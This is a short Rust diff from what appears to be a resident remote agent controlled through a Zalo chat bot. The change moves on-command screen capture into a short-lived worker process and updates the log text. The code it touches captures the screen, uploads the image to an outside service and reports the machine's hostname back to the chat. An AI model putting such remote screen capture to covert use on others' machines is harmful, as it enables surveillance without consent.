@@ -250,7 +250,9 @@ fn handle_screenshot(client: &Client, token: &str, chat_id: &str) {
     };
 
     let result = (|| -> Result<()> {
-        crate::platform::capture_screen(&path)?;
+        // Không capture trong process agent thường trú. Worker riêng chỉ được spawn
+        // khi có lệnh, chụp xong thoát để OS thu hồi sạch framebuffer/xcap allocations.
+        crate::capture_screen_isolated(&path)?;
         let url = media::upload_image(client, &path)?;
         let machine = std::env::var("COMPUTERNAME")
             .or_else(|_| std::env::var("HOSTNAME"))
@@ -268,7 +270,7 @@ fn handle_screenshot(client: &Client, token: &str, chat_id: &str) {
     let _ = std::fs::remove_file(&path);
 
     match result {
-        Ok(()) => state::append_log("screenshot captured and sent"),
+        Ok(()) => state::append_log("screenshot captured by worker and sent"),
         Err(err) => {
             state::append_log(&format!("screenshot command failed: {err:#}"));
             let _ = zalo::send_message(
